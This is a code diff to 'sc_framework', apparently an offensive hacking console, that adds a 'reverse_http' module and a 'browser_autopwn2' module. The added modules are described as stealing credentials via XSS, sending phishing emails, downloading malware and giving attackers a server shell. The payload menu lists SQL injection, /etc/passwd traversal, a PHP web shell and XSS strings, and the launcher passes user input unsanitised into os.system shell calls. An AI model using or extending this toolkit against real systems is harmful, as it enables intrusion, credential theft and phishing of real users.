@@ -144,8 +144,8 @@ color.red + """
     print(random_banner)
     print()
     print()
-    print(color.white + "        *[ " + color.red + "sc_framework v0.4" + color.white + "                          ]")
-    print("        *[ 26 exploits / 12 cve exploits / 8 payloads ]")
+    print(color.white + "        *[ " + color.red + "sc_framework v0.5" + color.white + "                          ]")
+    print("        *[ 28 exploits / 12 cve exploits / 10 payloads ]")
     print()
     print("sc_framework tip: type '" + color.blue + "help" + color.white + "' to see the " + color.underline + color.green + "scconsole" + color.white + " commands.")
     print()
@@ -180,7 +180,7 @@ PLEASE CHOOSE AN EXPLOIT THEN TYPE THIS!
         os.system('clear')
     elif scconsole == "search":
         print("""
-search <exploits | exploit | windows | site | cve-exploits | osx | linux | multi>        
+search <exploits | exploit | windows | site | cve-exploits | osx | linux | multi | server>        
 """)
     elif scconsole == "search exploits":
         print("""
@@ -211,6 +211,8 @@ search <exploits | exploit | windows | site | cve-exploits | osx | linux | multi
 """ + color.red + """multi/shell_reverse_tcp""" + color.white + """                             25/02/06 02:03       provides a reverse shell payload that can be used to establish a reverse shell connection.
 """ + color.red + """osx/kernel_xnu_ip_fragment_privesc""" + color.white + """                  25/02/06 09:43       exploits a vulnerability in the Apple kernel that allows privilege escalation through the IP fragmentation feature.
 """ + color.red + """osx/kernel_xnu_ip_fragment_privesc_2""" + color.white + """                25/02/06 09:43       exploits a vulnerability in the Apple kernel that allows privilege escalation through the IP fragmentation feature.
+""" + color.red + """site/reverse_http""" + color.white + """                                   25/02/08 06:53       the attacker sets up a listener on their own machine and waits for the server to send a request to their machine. When the server makes a request, the attacker's listener intercepts the request and executes a payload on the server. The payload can include commands to download malware, steal sensitive data, or gain access to the server's command-line interface (CLI).
+""" + color.red + """server/browser_autopwn2""" + color.white + """                             18/02/03 7:10        This module exploits a Cross-Site Scripting (XSS) vulnerability to steal user credentials and deliver a phishing email to the user.
 """)
     elif scconsole == "search exploit":
         print("""
@@ -246,6 +248,7 @@ search <exploits | exploit | windows | site | cve-exploits | osx | linux | multi
 """ + color.red + """site/DD_D_Attack""" + color.white + """                     25/02/01 02:01       for DoS and DDoS Attack (If your Internet is slow, that's gonna works slowly!).
 """ + color.red + """site/Directory-finder""" + color.white + """                25/02/06 06:11       Finds the Pages and directorys, and brute-forces the directorys (works slow).
 """ + color.red + """site/struts2_namespace_ognl""" + color.white + """          25/02/07 02:12       exploits the Struts2 framework to execute arbitrary code. It uses the OGNL injection vulnerability.
+""" + color.red + """site/reverse_http""" + color.white + """                                   25/02/08 06:53       the attacker sets up a listener on their own machine and waits for the server to send a request to their machine. When the server makes a request, the attacker's listener intercepts the request and executes a payload on the server. The payload can include commands to download malware, steal sensitive data, or gain access to the server's command-line interface (CLI).
 """)
     elif scconsole == "search cve-exploits":
         print()
@@ -286,6 +289,11 @@ search <exploits | exploit | windows | site | cve-exploits | osx | linux | multi
 """ + color.red + """linux/ssh-login-test""" + color.white + """                                24/01/11 05:54       for brute forcing ssh port (If your Internet is slow, that's gonna works slowly!).
 """ + color.red + """linux/ftp-login-test""" + color.white + """                                24/01/19 11:15       for login on port 21 or 20 ftp port.
 """)
+    elif scconsole == "search server":
+        print("""
+    Exploits                                        When created?        Discrepstion 
+""" + color.red + """server/browser_autopwn2""" + color.white + """                             18/02/03 7:10        This module exploits a Cross-Site Scripting (XSS) vulnerability to steal user credentials and deliver a phishing email to the user.
+""")
     elif scconsole == "show payloads":
         print("""
 """ + color.green + """' OR 1=1--""" + color.white + """   ---> SQL Injection payload.
@@ -303,135 +311,147 @@ search <exploits | exploit | windows | site | cve-exploits | osx | linux | multi
 """ + color.green + """../../../../etc/passwd""" + color.white + """  ---> directory traversal etc/passwd payload.
 
 """ + color.green + """<?php system($_GET['cmd']); ?>""" + color.white + """  ---> directory traversal php payload.
+
+""" + color.green + """<a href=javascript:alert('XSS')>Click Me</a>""" + color.white + """  ---> cross site XSS Click Me payload.
+
+""" + color.green + """javascript:alert('XSS')""" + color.white + """  ---> cross site XSS javascript payload.
 """)
     elif scconsole == "use exploit/bypassuac-eventvwr":
         time.sleep(0.5)
-        exploitbypassuaceventvwr()
         print("using exploit/bypassuac-eventvwr.")
+        exploitbypassuaceventvwr()
     elif scconsole == "use exploit/find-vulnerabilites-scan":
         time.sleep(0.5)
-        exploitfindvulnerabilitesscan()
         print("using exploit/find-vulnerabilites-scan.")
+        exploitfindvulnerabilitesscan()
     elif scconsole == "use exploit/ssh-version":
         time.sleep(0.5)
-        exploitsshversion()
         print("using exploit/ssh-version.")
+        exploitsshversion()
     elif scconsole == "use exploit/reverse-shell":
         time.sleep(0.5)
-        exploitreverseshell()
         print("using exploit/reverse-shell.")
+        exploitreverseshell()
     elif scconsole == "use exploit/handler/handler":
         time.sleep(0.5)
-        exploithandlerhandler()
         print("using exploit/handler/handler.")
+        exploithandlerhandler()
     elif scconsole == "use exploit/handler/listining":
         time.sleep(0.5)
-        exploithandlerlistining()
         print("using exploit/handler/listining.")
+        exploithandlerlistining()
     elif scconsole == "use exploit/cve-2023-22518/cve-2023-22518":
         time.sleep(0.5)
-        exploitcve202322518cve202322518()
         print("using exploit/cve-2023-22518/cve-2023-22518.")
+        exploitcve202322518cve202322518()
     elif scconsole == "use exploit/cve-2023-22518/vuln-test-for-cve-2023-22518":
         time.sleep(0.5)
-        exploitvulncve202322518cve202322518()
         print("using exploit/cve-2023-22518/vuln-test-for-cve-2023-22518.")
+        exploitvulncve202322518cve202322518()
     elif scconsole == "use windows/ssh-login-test":
         time.sleep(0.5)
-        wexploitsshlogintest()
         print("using windows/ssh-login-test.")
+        wexploitsshlogintest()
     elif scconsole == "use windows/java-rhino":
         time.sleep(0.5)
-        wexploitjavarhino()
         print("using windows/java-rhino.")
+        wexploitjavarhino()
     elif scconsole == "use windows/ms17-010-psexec":
         time.sleep(0.5)
-        wexploitms17010psexec()
         print("using windows/ms17-010-psexec.")
+        wexploitms17010psexec()
     elif scconsole == "use windows/PDF-exploit":
         time.sleep(0.5)
-        wexploitPDFexploit()
         print("using windows/PDF-exploit.")
+        wexploitPDFexploit()
     elif scconsole == "use windows/ftp-login-test":
         time.sleep(0.5)
-        wexploitftplogintest()
         print("using windows/ftp-login-test.")
+        wexploitftplogintest()
     elif scconsole == "use windows/7-zip_cve-2025-0411":
         time.sleep(0.5)
-        w7zipcve20250411()
         print("using windows/7-zip_cve-2025-0411.")
+        w7zipcve20250411()
     elif scconsole == "use site/XSS-SQLi-PHP-PASS":
         time.sleep(0.5)
-        texploitXSS()
         print("using site/XSS-SQLi-PHP-PASS.")
+        texploitXSS()
     elif scconsole == "use site/DD_D_Attack":
         time.sleep(0.5)
-        texploitDDDAttack()
         print("using site/DD_D_Attack.")
+        texploitDDDAttack()
     elif scconsole == "use site/vuln-curl-website":
         time.sleep(0.5)
-        texploitfindvulnerabiliteswebsite()
         print("using site/vuln-curl-website.")
+        texploitfindvulnerabiliteswebsite()
     elif scconsole == "use site/find-vulnerabilites-website2":
         time.sleep(0.5)
-        texploitfindvulnerabiliteswebsite2()
         print("using site/find-vulnerabilites-website2.")
+        texploitfindvulnerabiliteswebsite2()
     elif scconsole == "use site/http-login-test":
         time.sleep(0.5)
-        texploithttplogintest()
         print("using site/http-login-test.")
+        texploithttplogintest()
     elif scconsole == "use site/ZIP-exploit":
         time.sleep(0.5)
-        texploitZIPexploit()
         print("using site/ZIP-exploit.")
+        texploitZIPexploit()
     elif scconsole == "use site/tomcat-mgr-login":
         time.sleep(0.5)
-        texploittomcatmgrlogin()
         print("using site/tomcat-mgr-login.")
+        texploittomcatmgrlogin()
     elif scconsole == "use site/Directory-finder":
         time.sleep(0.5)
-        tdirectoryfinder()
         print("using site/Directory-finder.")
+        tdirectoryfinder()
     elif scconsole == "use site/struts2_namespace_ognl":
         time.sleep(0.5)
-        tstruts2namespaceognl()
         print("using site/struts2_namespace_ognl.")
+        tstruts2namespaceognl()
     elif scconsole == "use multi/ssh-login-test":
         time.sleep(0.5)
-        mexploitsshlogintest()
         print("using multi/ssh-login-test.")
+        mexploitsshlogintest()
     elif scconsole == "use multi/ftp-login-test":
         time.sleep(0.5)
-        mexploitftplogintest()
         print("using multi/ftp-login-test.")
+        mexploitftplogintest()
     elif scconsole == "use multi/shell_reverse_tcp":
         time.sleep(0.5)
-        mexploitreverseshell()
         print("using multi/shell_reverse_tcp.")
+        mexploitreverseshell()
     elif scconsole == "use osx/kernel_xnu_ip_fragment_privesc":
         time.sleep(0.5)
-        osxkernelxnuipfragmentprivesc()
         print("using osx/kernel_xnu_ip_fragment_privesc.")
+        osxkernelxnuipfragmentprivesc()
     elif scconsole == "use osx/kernel_xnu_ip_fragment_privesc_2":
         time.sleep(0.5)
-        osxkernelxnuipfragmentprivesc2()
         print("using osx/kernel_xnu_ip_fragment_privesc_2.")
+        osxkernelxnuipfragmentprivesc2()
     elif scconsole == "use osx/ssh-login-test":
         time.sleep(0.5)
-        oexploitsshlogintest()
         print("using osx/ssh-login-test.")
+        oexploitsshlogintest()
     elif scconsole == "use osx/ftp-login-test":
         time.sleep(0.5)
-        oexploitftplogintest()
         print("using osx/ftp-login-test.")
+        oexploitftplogintest()
     elif scconsole == "use linux/ssh-login-test":
         time.sleep(0.5)
-        lexploitsshlogintest()
         print("using linux/ssh-login-test.")
+        lexploitsshlogintest()
     elif scconsole == "use linux/ftp-login-test":
         time.sleep(0.5)
-        lexploitftplogintest()
         print("using linux/ftp-login-test.")
+        lexploitftplogintest()
+    elif scconsole == "use site/reverse_http":
+        time.sleep(0.5)
+        print("using site/reverse_http.")
+        treversehttp()
+    elif scconsole == "use server/browser_autopwn2":
+        time.sleep(0.5)
+        print("using server/browser_autopwn2.")
+        sserverbrowserautopwn2()
     elif scconsole == "use system commands":
             OSconsole()
             OSconsole()
@@ -1757,6 +1777,103 @@ you will specifiy these options when you run or exploit it!
         time.sleep(0.5)
         Console()
     elif scconsole45 == "exit":
+        exit()
+
+def treversehttp():
+    scconsole46 = input("sc~" + color.red + "(site/reverse_http)" + color.white + ">")
+    if scconsole46 == "help":
+        print("""
+help ---> to see this help menu.
+clear ---> to clear the screen.
+unuse ---> to unuse this exploit.
+exit ---> to exit from scconsole.
+run ---> to run the exploit you selected.
+exploit ---> to run the exploit you selected.
+show options ---> to see the options.
+""")
+        treversehttp()
+    elif scconsole46 == "clear":
+        os.system('clear')
+        treversehttp()
+    elif scconsole46 == "show options":
+        print("""
+OPTIONS          | DISCREPTIONS
+-----------------|----------------------
+LHOST            | specifiy the target url.
+
+you will specifiy these options when you run or exploit it!
+""")
+        treversehttp()
+    elif scconsole46 == "run":
+        os.system('python exploits/site/reverse_http.py')
+        treversehttp()
+    elif scconsole46 == "exploit":
+        os.system('python exploits/site/reverse_http.py')
+        treversehttp()
+    elif scconsole46 == "unuse":
+        print("unusing site/reverse_http.")
+        time.sleep(0.5)
+        Console()
+    elif scconsole46 == "exit":
+        exit()
+
+def sserverbrowserautopwn2():
+    scconsole26 = input("sc~" + color.red + "(server/browser_autopwn2)" + color.white + ">")
+    if scconsole26 == "help":
+        print("""
+help ---> to see this help menu.
+clear ---> to clear the screen.
+unuse ---> to unuse this exploit.
+exit ---> to exit from scconsole.
+run ---> to run the exploit you selected.
+exploit ---> to run the exploit you selected.
+show options ---> to see the options.
+show payloads ---> to see avalable payloads in sc-framework.
+""")
+        sserverbrowserautopwn2()
+    elif scconsole26 == "clear":
+        os.system('clear')
+        sserverbrowserautopwn2()
+    elif scconsole26 == "show options":
+        print("""
+OPTIONS          | DISCREPTIONS
+-----------------|----------------------
+LHOST            | specifiy the target URL.
+PAYLOAD          | specifiy the payload you want.
+PHISHING URL     | specifiy the phishing url.
+
+please copy the payload you want by typing (show payloads)!
+you will specifiy these options when you run or exploit it!
+""")
+        sserverbrowserautopwn2()
+    elif scconsole26 == "show payloads":
+        print("""
+<script>alert('XSS')</script>  ---> cross site XSS alert payload.
+
+<img src=x onerror=alert('XSS')>  ---> cross site XSS onerror payload.
+
+<a href=javascript:alert('XSS')>Click Me</a>  ---> cross site XSS Click Me payload.
+
+javascript:alert('XSS')  ---> cross site XSS javascript payload.
+""")
+        sserverbrowserautopwn2()
+    elif scconsole26 == "run":
+        targetsite = input("URL: ")
+        payload10 = input("PAYLOAD: ")
+        phishingurl = input("PHISHING URL: ")
+        os.system(f'python exploits/server/browser_autopwn2.py -u {targetsite} -p "{payload10}" -ph {phishingurl}')
+        sserverbrowserautopwn2()
+    elif scconsole26 == "exploit":
+        targetsite2 = input("URL: ")
+        payload101 = input("PAYLOAD: ")
+        phishingurl2 = input("PHISHING URL: ")
+        os.system(f'python exploits/server/browser_autopwn2.py -u {targetsite2} -p "{payload101}" -ph {phishingurl2}')
+        sserverbrowserautopwn2()
+    elif scconsole26 == "unuse":
+        print("unusing server/browser_autopwn2.")
+        time.sleep(0.5)
+        Console()
+    elif scconsole26 == "exit":
         exit()
 
 def OSconsole():
